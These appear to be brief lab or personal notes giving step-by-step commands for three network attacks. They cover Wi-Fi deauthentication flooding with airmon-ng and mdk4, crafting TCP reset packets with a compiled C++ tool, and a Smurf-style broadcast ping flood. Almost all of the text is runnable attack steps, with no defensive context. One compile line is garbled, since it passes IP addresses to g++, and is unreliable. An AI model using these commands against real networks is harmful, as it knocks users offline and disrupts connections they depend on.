Dauth Frames :
    install mdk4

    setup an interface in monitor mode :
        sudo airmon-ng start <interface>
        if error kill the process : sudo airmon-ng check kill

        iwconfig should show a new interface : <interface>mon
        the attack will be done on this interface
    sudo mdk4 <interface> d -w <file> -c <channel>
        file = WhiteList MAC address
        channel = channel of the AP (remove -c <channel> for exe on all channel)

crafting packet
    use g++ -o rst_packet rst_packet.cpp <ipSrc> <ipDst> (use a valid ip address for ipSrc and ipDst)
    look at if reset packets are detected by the sniffer (RST Flag: ...)

SMURF : attack use ;
    ping -b <broadcast ip> -c <number of packet> <ip to ping>
    or just ping <ip>
